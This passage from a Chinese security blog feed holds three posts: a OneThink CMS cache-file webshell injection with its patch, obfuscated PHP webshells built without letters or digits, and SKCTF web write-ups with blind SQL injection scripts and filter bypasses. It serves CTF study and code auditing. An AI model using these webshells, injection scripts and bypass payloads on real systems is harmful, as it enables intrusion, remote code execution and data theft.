src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/LlFgJ2c33k.png?imageslim" alt="mark"></p><pre><code>&#39;onethink_&#39;.md5(md5($name));</code></pre><p>最后就是<code>onethink_md5(md5(name)).php</code>了</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>现在我们构造payload：</p><p>用户名注册为%0aphpinfo();#这样在存储缓存文件的时候就可以写入webshell，#注释了序列化的剩余部分，前面的%0a的作用则是为了不让$data中<code>&lt;?php\n//&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;</code>的<code>//</code>注释攻击代码</p><p>在OneThink的注册页面中的注册用户名为:<code>%0aphpinfo();#</code>，但是考虑到有长度限制，可以利用burp抓包改包。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/Ek8LAgb161.png?imageslim" alt="mark"></p><p>之后用这个用户名登陆，之后访问<code>Temp/Runtime/namemd5.php</code>，即可发现phpinfo得以执行.但是注意一点，就是其<code>$name</code>变量不是usename，而是前面S()函数的参数即<code>sys_active_user_list</code><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/Gi5a2kHEF0.png?imageslim" alt="mark"></p><p>访问<br><code>http://127.0.0.1/onethink/Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/abF35FiB4J.png?imageslim" alt="mark"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p> 临时解决方案，通过强化缓存的文件名规则，让动态缓存文件难以被反向找到。 修复补丁下载地<a href="http://pan.baidu.com/s/1gdAFMSz">http://pan.baidu.com/s/1gdAFMSz</a> </p><p>补丁修改了最后filename()函数的一句话</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  private function filename($name) &#123;</span><br><span class="line">      $name&#x3D;md5(C(&#39;DATA_AUTH_KEY&#39;).$name);   &#x2F;&#x2F;此处为补丁</span><br><span class="line">&#x2F;&#x2F; $name&#x3D;&#39;onethink_&#39;.md5(md5($name));  &#x2F;&#x2F;原本代码</span><br><span class="line">      if(C(&#39;DATA_CACHE_SUBDIR&#39;)) &#123;</span><br><span class="line">          &#x2F;&#x2F; 使用子目录</span><br><span class="line">          $dir   &#x3D;&#39;&#39;;</span><br><span class="line">          for($i&#x3D;0;$i&lt;C(&#39;DATA_PATH_LEVEL&#39;);$i++) &#123;</span><br><span class="line">              $dir.&#x3D;$name&#123;$i&#125;.&#39;&#x2F;&#39;;</span><br><span class="line">          &#125;</span><br><span class="line">          if(!is_dir($this-&gt;options[&#39;temp&#39;].$dir)) &#123;</span><br><span class="line">              mkdir($this-&gt;options[&#39;temp&#39;].$dir,0755,true);</span><br><span class="line">          &#125;</span><br><span class="line">          $filename&#x3D;$dir.$this-&gt;options[&#39;prefix&#39;].$name.&#39;.php&#39;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">          $filename&#x3D;$this-&gt;options[&#39;prefix&#39;].$name.&#39;.php&#39;;</span><br><span class="line">      &#125;</span><br><span class="line">      return $this-&gt;options[&#39;temp&#39;].$filename;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这样将一个可控的或者说可知的文件名，改成了未知不可控的文件名。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>花了一下午的时间，找漏洞，还是在有博客的帮助下。大牛们挖洞真的也不容易啊。。。</p><p>第一次大型CMS的代码审计感觉非常烦躁，好多同名函数，一会就弄混了，希望之后能渐渐游刃有余起来。</p><h1 id="0xff-参考链接"><a href="#0xff-参考链接" class="headerlink" title="0xff 参考链接"></a>0xff 参考链接</h1><p><a href="https://ox1234.github.io/2018/07/27/OneThink%20CMS%E7%9A%84%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/">OneThink CMS的缓存漏洞的分析</a><br><a href="http://0day5.com/archives/3106/">ThinkOX全版本通杀0day </a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没有数字字母的WebShell</title>
      <link href="/2018/05/28/Shell-without-alpnum/"/>
      <url>/2018/05/28/Shell-without-alpnum/</url>
      
        <content type="html"><![CDATA[<h1 id="WebShell-Without-alpnum"><a href="#WebShell-Without-alpnum" class="headerlink" title="WebShell Without alpnum"></a>WebShell Without alpnum</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2018 5.26-5.27 SUCTF web题考到一个过滤所有数字和字母的shell。特去看了一些这个方面的文章，转载p牛的一篇叫详细的文章，学习了orz。<br>原文链接：<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><h2 id="简单的测试代码"><a href="#简单的测试代码" class="headerlink" title="简单的测试代码"></a>简单的测试代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line">  eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中<code>assert</code>是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br></pre></td></tr></table></figure><p>执行效果如下：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/B3bJLC6IAc.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/j18J1H2HC0.png?imageslim" alt="mark"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s：</p><p>利用这个特性，我找了一篇文章（ <a href="https://www.leavesongs.com/THINK/answer.html">https://www.leavesongs.com/THINK/answer.html</a> ），自动选择了其中一些汉字，生成如下答案：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/2l6bJGb9gI.png?imageslim" alt="mark"></p><p>细心的同学发现了，这里用到了数字<code>1</code>和<code>2</code>,但是㔻说不能有数字吗?   </p><p>这个答案还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。</p><pre><code>php &gt; echo &#39;&gt;&#39;&gt;&#39;&lt;&#39;;1</code></pre><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);</span><br><span class="line">$_&#x3D;$__&#x2F;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试结果如下：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/0J1heI4mJd.png?imageslim" alt="mark"></p><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/kgJm2615Kb.png?imageslim" alt="mark"></p><p>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/f28gkIagEC.png?imageslim" alt="mark"></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($<em>POST[</em>])，无需获取小写a）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++; &#x2F;&#x2F; E </span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure><p>测试结果如下：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180603/Ba9hk0gAHg.png?imageslim" alt="mark"></p><p>一开始不成功，url编码后，成功。</p><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>看了p牛的方法二的弱类型，深受启发，我想也可以通过这种弱类型构造数字，然后利用url编码转换成字母，例如%97-&gt;a，但是缺点就是需要用到很多的字符。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018-3rd-SKCTF</title>
      <link href="/2018/05/12/3rd-SKCTF2018/"/>
      <url>/2018/05/12/3rd-SKCTF2018/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="wait-a-minute"><a href="#wait-a-minute" class="headerlink" title="wait a minute"></a>wait a minute</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strcmp($_POST[<span class="string">&#x27;password&#x27;</span>],$password)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;time&#x27;</span>]))&#123;</span><br><span class="line">$t=$_GET[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($t))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Sorry.&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($t &lt; <span class="number">66</span> * <span class="number">55</span> * <span class="number">44</span> * <span class="number">33</span> * <span class="number">22</span> * <span class="number">11</span> )&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;you need a bigger time.&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($t &gt; <span class="number">11</span> * <span class="number">23</span> * <span class="number">33</span> * <span class="number">44</span> * <span class="number">55</span> * <span class="number">66</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;you need a smaller time.&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                sleep((<span class="keyword">int</span>)$t);</span><br><span class="line">                var_dump($flag);</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password is wrong............&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逻辑很简单，password可以通过构造数组绕过。<br>time比较麻烦，首先<code>time=11*22*33*44*55*66</code>，但是由于sleep(time)，这么大的time，要等待很久，大概算一下是几百天吧，这里由于用到强制转换<code>(int)$t</code>。<br>而16进制0x开头在强制转换中出现问题，导致转换成0.</p><p>所以payload为：<code>?time=0x4c06f350</code>.</p><h2 id="八大关"><a href="#八大关" class="headerlink" title="八大关"></a>八大关</h2><p>这道，一关又一关，但其实还是都比较简单的。<br>1.XFF<br>2.UA<br>3.php弱类型md5<br>4.strcmp<br>5.md5爆破，附上脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmd5</span>(<span class="params">code</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999999</span>):</span><br><span class="line">temp = hashlib.md5(str(i)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> temp[<span class="number">0</span>:<span class="number">6</span>] == code:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">print</span> getmd5(<span class="string">&#x27;084a12&#x27;</span>)</span><br></pre></td></tr></table></figure><p>6.php弱类型，数组绕过(md5(arr)==null)<br>7.urldecode，在传递url时，会进行一次，所以要两次urlencode（’SKCTF’）<br>8.js,看源码就知道了密码了。</p><h2 id="php-string"><a href="#php-string" class="headerlink" title="php string"></a>php string</h2><p>首先、我有一个误区：看到图片名称heredoc我以为会是一个冒充web的隐写题，图片里有个doc这样的==、<br>提示说文件泄露，得到index.php.swp<br>Linux 还原：</p><pre><code>vim -r index.php.swp</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180512/DFih50Lkh3.png?imageslim" alt="mark"><br>逻辑很简单，只要id=’6666’,即可。(这道题，当时我真的眼瞎==、只看到了6666，自动忽略了两个<code>&#39;</code>)<br>但是问题在于：直接传进去的id是有过滤的，过滤了<code>&#39;</code>，所以没有办法直接让id=’6666’，这是才是佩奇的提示==、heredoc！</p><blockquote><p>heredoc是一种perl风格的定界符。用于定界和传递字符串。用 heredoc 句法结构：&lt;&lt;&lt;。在该运算符之后要提供一个标识符，然后换行。接下来是字符串 string 本身，最后要用前面定义的标识符作为结束标志。 </p></blockquote><p><a href="http://php.net/manual/zh/language.types.string.php#language.types.string.syntax.heredoc">php手册中heredoc的相关介绍</a></p><p>于是我们知道了：可以利用heredoc来绕过<code>&#39;</code>的过滤。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;xx</span><br><span class="line">6666</span><br><span class="line">xx;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是注意的是每一行都需要一个换行符,url里用%0a,<br>payload:<code>?id=&lt;&lt;&lt;xx%0A6666%0Axx;%0A</code></p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><p>有源码泄露，得到源码<code>/www.zip</code>,<br>里面有三个php文件：<br>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> rand();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;up_addr&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;rand_addr.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;up_addr&#x27;</span>]===$up_addr&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $str = $_POST[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kkk.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class  SKCTF&#123;</span><br><span class="line">    var $content;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        include(&quot;rand_addr.php&quot;);</span><br><span class="line">        var_dump($this-&gt;content);</span><br><span class="line">        file_put_contents(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;$up_addr.php&quot;,$this-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new SKCTF();</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rand_addr.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$up_addr &#x3D; str_shuffle(&#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;);</span><br></pre></td></tr></table></figure><p>这道题是考的是session的反序列化。有点难，先放一放==、</p><h2 id="login-me"><a href="#login-me" class="headerlink" title="login me"></a>login me</h2><blockquote><p>听说只有admin才能拿到flag。</p></blockquote><p>本题考查sql bool盲注。一开始把问题想简单了，以为只是admin的万能密码之类的==、<br>先做一下无过滤的版本：<br>payload:</p><pre><code>username=1&#39; or substr(&#39;a&#39;,1,1)=&#39;a&#39;#&amp;password=123</code></pre><p>下面就开始盲注，这里盲注成功的条件是返回弹窗<code>Wrong password</code>,失败返回<code>Wrong username</code> </p><p>源码给出提示，直接访问web4.sql得到表的结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Host: localhost  (Version: 5.5.53-log)</span><br><span class="line"># Date: 2018-05-04 17:13:56</span><br><span class="line"># Generator: MySQL-Front 5.3  (Build 4.234)</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET NAMES utf8 *&#x2F;;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Structure for table &quot;admin&quot;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;admin&#96;;</span><br><span class="line">CREATE TABLE &#96;admin&#96; (</span><br><span class="line">  &#96;id&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;username&#96; char(20) DEFAULT NULL,</span><br><span class="line">  &#96;password&#96; char(40) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Structure for table &quot;f1ag&quot;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;f1ag&#96;;</span><br><span class="line">CREATE TABLE &#96;f1ag&#96; (</span><br><span class="line">  &#96;f14g&#96; char(40) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><p>得到表的结构为：</p><ul><li>admin<ul><li>id</li><li>username</li><li>password</li></ul></li><li>f1ag<ul><li>f14g</li></ul></li></ul><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;192.168.211.131:49157&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">postdata&#x3D;&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;</span><br><span class="line">r &#x3D; requests.post(url,postdata).content</span><br><span class="line">#print r;</span><br><span class="line">return &#39;Wrong password&#39; in r</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; r&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#39;</span><br><span class="line">for i in xrange(1,64):</span><br><span class="line">for c in s:</span><br><span class="line">payload &#x3D;&#39;1\&#39;or substr((select f14g from f1ag),%s,1) &#x3D; \&#39;%s\&#39;#&#39;%(str(i),c)</span><br><span class="line">#print payload</span><br><span class="line">if check(payload):</span><br><span class="line">flag +&#x3D; c</span><br><span class="line">break</span><br><span class="line">print flag</span><br><span class="line">if &#39;&#125;&#39; in flag:</span><br><span class="line">break</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180512/37Egjm9m2e.png?imageslim" alt="mark"></p><p>接下来是加上waf,过滤以后的==、</p><p>首先测试过滤。过滤采用burp进行fuzz。结果如下：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180512/IgECkdADIl.png?imageslim" alt="mark"></p><p>过滤<code>union</code>,<code>if</code>,<code>=</code>,<code>and</code>,<code>&lt;</code>,<code>&gt;</code>,<code>or</code>,<code>substr</code>,<code>mid</code>,<code>like</code>,空格</p><p>可以用<code>/**/</code>绕过空格，<code>in</code>绕过<code>=</code>,<code>lpad</code>函数代替<code>substr</code>用于截取字符串。</p><p>payload：<code>username=1&#39;/**/||lpad((&#39;a&#39;),1,1)/**/in/**/(&#39;a&#39;)#&amp;password=123</code></p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;192.168.211.131:49154&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">postdata&#x3D;&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;123&#39;&#125;</span><br><span class="line">r &#x3D; requests.post(url,postdata).content</span><br><span class="line">#print r;</span><br><span class="line">return &#39;Wrong password&#39; in r</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; r&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#39;</span><br><span class="line">for i in xrange(1,64):</span><br><span class="line">for c in s:</span><br><span class="line">#payload &#x3D;&#39;1\&#39;or substr((select f14g from f1ag),%s,1) &#x3D; \&#39;%s\&#39;#&#39;%(str(i),c)</span><br><span class="line">payload &#x3D; &#39;1\&#39;&#x2F;**&#x2F;||&#x2F;**&#x2F;lpad((select&#x2F;**&#x2F;f14g&#x2F;**&#x2F;from&#x2F;**&#x2F;f1ag),%s,1)&#x2F;**&#x2F;in&#x2F;**&#x2F;(\&#39;%s\&#39;)#&#39;%(str(i),flag+c)</span><br><span class="line">#print payload</span><br><span class="line">if check(payload):</span><br><span class="line">flag +&#x3D; c</span><br><span class="line">break</span><br><span class="line">print flag</span><br><span class="line">if &#39;&#125;&#39; in flag:</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180513/f8BhJIKjAd.png?imageslim" alt="mark"></p><h2 id="绕啊绕"><a href="#绕啊绕" class="headerlink" title="绕啊绕"></a>绕啊绕</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$rule &#x3D; 